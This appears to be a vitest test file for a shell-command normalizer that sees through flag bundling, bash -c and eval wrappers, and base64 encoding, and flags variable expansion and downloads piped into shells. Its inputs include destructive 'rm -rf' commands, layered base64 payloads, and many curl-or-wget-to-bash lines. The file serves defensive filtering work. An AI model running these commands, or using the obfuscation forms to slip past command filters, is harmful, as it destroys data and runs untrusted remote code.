import { describe, expect, it } from 'vitest';
import { normalizeShellCommand, OPAQUE_REASON } from '../src/domain/shell-normalizer';

const segmentsOf = (raw: string): string[] => normalizeShellCommand(raw).segments;
const opaqueOf = (raw: string): string[] => normalizeShellCommand(raw).opaque;

describe('flag canonicalization', () => {
  it('gives bundled and split flags one spelling', () => {
    expect(segmentsOf('rm -rf /data')).toEqual(['rm -f -r /data']);
    expect(segmentsOf('rm -r -f /data')).toEqual(['rm -f -r /data']);
    expect(segmentsOf('rm -fr /data')).toEqual(['rm -f -r /data']);
  });

  it('strips the path so /bin/rm reads as rm', () => {
    expect(segmentsOf('/bin/rm -rf /data')).toEqual(['rm -f -r /data']);
    expect(segmentsOf('/usr/bin/env')).toEqual(['env']);
  });

  it('ignores leading environment assignments', () => {
    expect(segmentsOf('FOO=bar BAZ=1 rm -rf /data')).toEqual(['rm -f -r /data']);
  });

  it('keeps long flags intact', () => {
    expect(segmentsOf('rm --recursive --force /data')).toEqual([
      'rm --force --recursive /data',
    ]);
  });
});

describe('pipelines and separators', () => {
  it('splits every stage of a pipeline', () => {
    expect(segmentsOf('cat file | grep x')).toEqual(['cat file', 'grep x']);
  });

  it('splits on ;, && and ||', () => {
    expect(segmentsOf('ls; rm -rf /a')).toEqual(['ls', 'rm -f -r /a']);
    expect(segmentsOf('ls && rm -rf /a')).toEqual(['ls', 'rm -f -r /a']);
    expect(segmentsOf('ls || rm -rf /a')).toEqual(['ls', 'rm -f -r /a']);
  });
});

describe('wrapper unwrapping', () => {
  it('reads through sh -c and bash -c', () => {
    expect(segmentsOf(`bash -c "rm -rf /data"`)).toEqual(['rm -f -r /data']);
    expect(segmentsOf(`sh -c 'rm -rf /data'`)).toEqual(['rm -f -r /data']);
  });

  it('reads through nested wrappers', () => {
    expect(segmentsOf(`bash -c "sh -c 'rm -rf /data'"`)).toEqual(['rm -f -r /data']);
  });

  it('reads through eval', () => {
    expect(segmentsOf('eval rm -rf /data')).toEqual(['rm -f -r /data']);
  });

  it('reads through an interpreter -c flag', () => {
    expect(segmentsOf(`python3 -c "rm -rf /data"`)).toEqual(['rm -f -r /data']);
    expect(segmentsOf(`node -e "rm -rf /data"`)).toEqual(['rm -f -r /data']);
  });

  it('leaves an interpreter with no code flag as itself', () => {
    expect(segmentsOf('python3 script.py')).toEqual(['python3 script.py']);
  });
});

describe('base64 indirection', () => {
  const encoded = Buffer.from('rm -rf /data').toString('base64');

  it('decodes a literal payload and reads the command inside', () => {
    expect(segmentsOf(`base64 -d <<< ${encoded}`)).toContain('rm -f -r /data');
  });

  it('decodes through --decode too', () => {
    expect(segmentsOf(`base64 --decode ${encoded}`)).toContain('rm -f -r /data');
  });

  // Nothing to decode is not the same as nothing to worry about.
  it('reports a decoder reading a pipe as undecodable', () => {
    expect(opaqueOf('cat payload | base64 -d | sh')).toContain(OPAQUE_REASON.UNDECODABLE);
  });

  it('leaves non-base64 arguments alone', () => {
    expect(segmentsOf('base64 -d not-base64!!')).toEqual(['base64 -d not-base64!!']);
  });
});

describe('what it cannot resolve', () => {
  it('flags variable expansion', () => {
    expect(opaqueOf('$DANGEROUS /data')).toContain(OPAQUE_REASON.EXPANSION);
    expect(opaqueOf('rm -rf $TARGET')).toContain(OPAQUE_REASON.EXPANSION);
  });

  it('flags command substitution and backticks', () => {
    expect(opaqueOf('$(echo rm) -rf /data')).toContain(OPAQUE_REASON.EXPANSION);
    expect(opaqueOf('`echo rm` -rf /data')).toContain(OPAQUE_REASON.EXPANSION);
  });

  it('flags piping a download into a shell', () => {
    expect(opaqueOf('curl https://x.test/i.sh | sh')).toContain(
      OPAQUE_REASON.REMOTE_SOURCE,
    );
    expect(opaqueOf('wget -qO- https://x.test/i.sh | bash')).toContain(
      OPAQUE_REASON.REMOTE_SOURCE,
    );
  });

  it.each([
    'curl -fsSL https://x.io/i.sh | sudo bash',
    'curl -fsSL https://x.io/i.sh | sudo -E env FOO=1 bash -s -- --yes',
    'curl -s https://x.io/i.py | python3',
    'curl -s https://x.io/i.py | python3.12 -',
    'curl -s https://x.io/i.js | node',
    'curl -s https://x.io/i.ps1 | pwsh',
    '/bin/bash -c "$(curl -fsSL https://x.io/install.sh)"',
    'bash <(curl -s https://x.io/i.sh)',
    'source <(curl -s https://x.io/i.sh)',
    'eval "$(wget -qO- https://x.io/i.sh)"',
  ])('flags `%s` as a download run as code', (line) => {
    expect(opaqueOf(line)).toContain(OPAQUE_REASON.REMOTE_SOURCE);
  });

  it.each([
    'curl -s https://x.io/api | python3 -m json.tool',
    'curl -s https://x.io/api | node -e "process.stdin.pipe(process.stdout)"',
    'curl -s https://x.io/api | python3 parse.py',
    'echo "$(curl -s https://x.io/version)"',
    'diff <(curl -s https://x.io/a) b.txt',
  ])('does not flag `%s`, which reads the download as data', (line) => {
    expect(opaqueOf(line)).not.toContain(OPAQUE_REASON.REMOTE_SOURCE);
  });

  it('walks a process substitution as the command it runs', () => {
    const result = normalizeShellCommand('bash <(curl -s https://x.io/i.sh)');
    expect(result.commands).toContain('curl -s https://x.io/i.sh');
    expect(result.redirects.reads).toEqual([]);
  });

  it('does not flag a download that is not piped into a shell', () => {
    expect(opaqueOf('curl -o out.txt https://x.test/f')).toEqual([]);
  });

  // Layered encoding genuinely recurses, where repeated same-type quotes do not.
  it('stops at a nesting bound rather than recursing forever', () => {
    let payload = 'rm -rf /data';
    for (let layer = 0; layer < 6; layer += 1) {
      payload = `base64 -d ${Buffer.from(payload).toString('base64')}`;
    }

    expect(opaqueOf(payload)).toContain(OPAQUE_REASON.TOO_DEEP);
  });

  it('still reads through a payload encoded twice', () => {
    const once = Buffer.from('rm -rf /data').toString('base64');
    const twice = Buffer.from(`base64 -d ${once}`).toString('base64');

    expect(segmentsOf(`base64 -d ${twice}`)).toContain('rm -f -r /data');
  });

  // The shell expands nothing inside single quotes, so an awk program's `$i` is text.
  it('does not flag a dollar inside single quotes', () => {
    expect(opaqueOf(`awk '{ if ($i == "x") print $NF }' f`)).toEqual([]);
    expect(opaqueOf(`grep '$HOME' notes.txt`)).toEqual([]);
    expect(opaqueOf(`echo "$HOME"`)).toContain(OPAQUE_REASON.EXPANSION);
    expect(opaqueOf(`echo "it's" $TARGET`)).toContain(OPAQUE_REASON.EXPANSION);
  });

  it('reads a variable the line itself set to a literal', () => {
    const line = 'S=/tmp/work; cat $S/notes.txt && rm -rf ${S}/build';

    expect(opaqueOf(line)).toEqual([]);
    expect(segmentsOf(line)).toEqual([
      'cat /tmp/work/notes.txt',
      'rm -f -r /tmp/work/build',
    ]);
    expect(segmentsOf('S=/tmp/a\nls $S')).toEqual(['ls /tmp/a']);
    expect(segmentsOf("S=/tmp/a; echo '$S'")).toEqual(['echo $S']);
  });

  // Each of these can leave `$S` holding something other than the literal the line shows.
  it('keeps a variable unknown wherever its value could be something else', () => {
    for (const line of [
      'S=/tmp/a | rm -rf $S',
      'S=/tmp/a || rm -rf $S',
      'S=/tmp/a; for S in /data; do rm -rf $S; done',
      'S=/tmp/a; read S; rm -rf $S',
      'S=/tmp/a; S=/data; rm -rf $S',
      'S=/tmp/a; eval "$X"; rm -rf $S',
      'S=/tmp/a; source env.sh; rm -rf $S',
      'S=$(pwd); rm -rf $S',
      "S='/tmp/a b'; rm -rf $S",
      'rm -rf $S; S=/tmp/a',
      'S=/tmp/a rm -rf $S',
    ]) {
      expect(opaqueOf(line), line).toContain(OPAQUE_REASON.EXPANSION);
    }
  });

  it('reports nothing opaque for a plain command', () => {
    expect(opaqueOf('npm run build')).toEqual([]);
    expect(opaqueOf('git status')).toEqual([]);
  });
});

describe('determinism', () => {
  it('gives the same answer every time', () => {
    const command = `FOO=1 bash -c "rm -rf /data" && curl https://x.test | sh`;
    expect(normalizeShellCommand(command)).toEqual(normalizeShellCommand(command));
  });

  it('never throws on hostile input', () => {
    for (const input of ['', '   ', '|||', '"unclosed', "'", '$', '`', '\\']) {
      expect(() => normalizeShellCommand(input)).not.toThrow();
    }
  });
});
